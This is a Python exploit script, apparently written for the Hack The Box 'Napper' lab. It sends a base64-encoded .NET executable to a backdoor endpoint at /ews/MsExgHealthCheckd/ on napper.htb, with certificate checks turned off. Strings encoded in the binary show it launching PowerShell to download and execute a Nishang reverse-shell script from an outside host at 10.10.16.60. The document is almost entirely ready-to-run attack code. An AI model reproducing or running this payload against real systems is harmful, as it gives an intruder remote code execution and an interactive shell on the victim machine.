import urllib.parse

import requests
from urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
payload = """ 
TVqQAAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAgAAAAA4fug4AtAnNIbgBTM0hVGhpcyBwcm9ncmFtIGNhbm5vdCBiZSBydW4gaW4gRE9TIG1v
ZGUuDQ0KJAAAAAAAAABQRQAATAEDAAAAAAAAAAAAAAAAAOAAAgELAQgAAAYAAAAGAAAAAAAAziUA
AAAgAAAAQAAAAABAAAAgAAAAAgAABAAAAAAAAAAEAAAAAAAAAACAAAAAAgAAAAAAAAMAQIUAABAA
ABAAAAAAEAAAEAAAAAAAABAAAAAAAAAAAAAAAIAlAABLAAAAAEAAAOACAAAAAAAAAAAAAAAAAAAA
AAAAAGAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAIAAACAAAAAAAAAAAAAAACCAAAEgAAAAAAAAAAAAAAC50ZXh0AAAA1AUAAAAgAAAABgAAAAIA
AAAAAAAAAAAAAAAAACAAAGAucnNyYwAAAOACAAAAQAAAAAQAAAAIAAAAAAAAAAAAAAAAAABAAABA
LnJlbG9jAAAMAAAAAGAAAAACAAAADAAAAAAAAAAAAAAAAAAAQAAAQgAAAAAAAAAAAAAAAAAAAACw
JQAAAAAAAEgAAAACAAUAACEAAHwEAAABAAAAAgAABgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAABswAwCJAAAAAQAAEQIoAQAACnIBAABwCnMCAAAKCwcGbwMA
AAoMckcAAHBzBAAAChMEEQRyZQAAcAYoBQAACm8GAAAKEQQXbwcAAAoRBBdvCAAAChEEFm8JAAAK
EQQXbwoAAAoRBA1zCwAAChMGEQYJbwwAAAoRBhMFEQVvDQAACibdDQAAAAc5BgAAAAdvDgAACtwq
AAAAARAAAAIAEgBpewANAAAAAB5zAQAABiYqQlNKQgEAAQAAAAAADAAAAHY0LjAuMzAzMTkAAAAA
BQBsAAAAVAEAACN+AADAAQAAeAEAACNTdHJpbmdzAAAAADgDAADQAAAAI1VTAAgEAAAQAAAAI0dV
SUQAAAAYBAAAZAAAACNCbG9iAAAAAAAAAAIAABBHFQIACQAAAAD6ATMAFgAAAQAAAAcAAAACAAAA
AgAAAAEAAAAPAAAAAQAAAAEAAAABAAAAAgAAAAAAagEBAAAAAAAGABUAHAAKACkAMwAKAE0AXgAG
AHEAHAAKAOkAXgAGAAUBHAAGACMBQQEAAAAAAQAAAAAAAQABAAEAEAARAAoABQABAAEAUCAAAAAA
hhgjAAEAAQD4IAAAAACWAB4BMwABAAAAAQAZAQkAIwABABEAIwABABEAPgAFABkAIwAKACEAeAAP
ABkAfwAKABkAjQAVABkAqAAVABkAwgAVABkA1gAVACkAIwABACkA8QAaACkA/wAgADEAEQEBADkA
IwABAC4AewA5ACQABIAAAAAAAAAAAAAAAAAAAAAACgAAAAQAAAAAAAAAAAAAAFgAYQEAAAAABAAA
AAAAAAAAAAAAWAAcAAAAAAAAAAA8TW9kdWxlPgBzaGVsbDIAUnVuAE9iamVjdABTeXN0ZW0ALmN0
b3IAV2ViQ2xpZW50AFN5c3RlbS5OZXQARG93bmxvYWRTdHJpbmcAUHJvY2Vzc1N0YXJ0SW5mbwBT
eXN0ZW0uRGlhZ25vc3RpY3MAU3RyaW5nAEZvcm1hdABzZXRfQXJndW1lbnRzAHNldF9SZWRpcmVj
dFN0YW5kYXJkT3V0cHV0AHNldF9SZWRpcmVjdFN0YW5kYXJkRXJyb3IAc2V0X1VzZVNoZWxsRXhl
Y3V0ZQBzZXRfQ3JlYXRlTm9XaW5kb3cAUHJvY2VzcwBzZXRfU3RhcnRJbmZvAFN0YXJ0AElEaXNw
b3NhYmxlAERpc3Bvc2UAYXJncwBNYWluAFJ1bnRpbWVDb21wYXRpYmlsaXR5QXR0cmlidXRlAFN5
c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMAbXNjb3JsaWIAc2hlbGwyLmV4ZQAAAAAARWgA
dAB0AHAAOgAvAC8AMQAwAC4AMQAwAC4AMQA2AC4ANgAwAC8AbgBpAHMAaABhAG4AcwBoAGUAbABs
AC4AcABzADEAAB1wAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAAGdJAEUAWAAoAE4AZQB3AC0A
TwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBh
AGQAUwB0AHIAaQBuAGcAKAAnAHsAMAB9ACcAKQAAAAAAmJowHQd7hEKcEIjy8sCAKwADIAABBCAB
Dg4EIAEBDgUAAg4OHAQgAQECBSABARINAyAAAg4HBw4SCQ4SDRINEhUSFQUAAQEdDh4BAAEAVAIW
V3JhcE5vbkV4Y2VwdGlvblRocm93cwEIt3pcVhk04IkAAAAAAAAAqCUAAAAAAAAAAAAAviUAAAAg
AAAAAAAAAAAAAAAAAAAAAAAAAAAAALAlAAAAAAAAAABfQ29yRXhlTWFpbgBtc2NvcmVlLmRsbAAA
AAAA/yUAIEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAEAEAAAABgAAIAAAAAAAAAAAAAAAAAAAAEAAQAAADAAAIAAAAAAAAAAAAAAAAAA
AAEAAAAAAEgAAABYQAAAiAIAAAAAAAAAAAAAiAI0AAAAVgBTAF8AVgBFAFIAUwBJAE8ATgBfAEkA
TgBGAE8AAAAAAL0E7/4AAAEAAAAAAAAAAAAAAAAAAAAAAD8AAAAAAAAABAAAAAIAAAAAAAAAAAAA
AAAAAABEAAAAAQBWAGEAcgBGAGkAbABlAEkAbgBmAG8AAAAAACQABAAAAFQAcgBhAG4AcwBsAGEA
dABpAG8AbgAAAAAAfwCwBOgBAAABAFMAdAByAGkAbgBnAEYAaQBsAGUASQBuAGYAbwAAAMQBAAAB
ADAAMAA3AGYAMAA0AGIAMAAAABwAAgABAEMAbwBtAG0AZQBuAHQAcwAAACAAAAAkAAIAAQBDAG8A
bQBwAGEAbgB5AE4AYQBtAGUAAAAAACAAAAAsAAIAAQBGAGkAbABlAEQAZQBzAGMAcgBpAHAAdABp
AG8AbgAAAAAAIAAAADAACAABAEYAaQBsAGUAVgBlAHIAcwBpAG8AbgAAAAAAMAAuADAALgAwAC4A
MAAAADAABwABAEkAbgB0AGUAcgBuAGEAbABOAGEAbQBlAAAAcwBoAGUAbABsADIAAAAAACgAAgAB
AEwAZQBnAGEAbABDAG8AcAB5AHIAaQBnAGgAdAAAACAAAAAsAAIAAQBMAGUAZwBhAGwAVAByAGEA
ZABlAG0AYQByAGsAcwAAAAAAIAAAAEAACwABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBt
AGUAAABzAGgAZQBsAGwAMgAuAGUAeABlAAAAAAAkAAIAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUA
AAAAACAAAAAoAAIAAQBQAHIAbwBkAHUAYwB0AFYAZQByAHMAaQBvAG4AAAAgAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAAAAwA
AADQNQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=

"""
hosts = ["napper.htb"]
form_field = f"sdafwe3rwe23={urllib.parse.quote(payload)}"
for h in hosts:
    url_ssl = f"https://{h}/ews/MsExgHealthCheckd/"
    try:
        r_ssl = requests.post(url_ssl, data=form_field, verify=False)
        print(f"{url_ssl} : {r_ssl.status_code}{r_ssl.headers}")
    except KeyboardInterrupt:
        exit()
    except Exception as e:
        print(e)
        pass


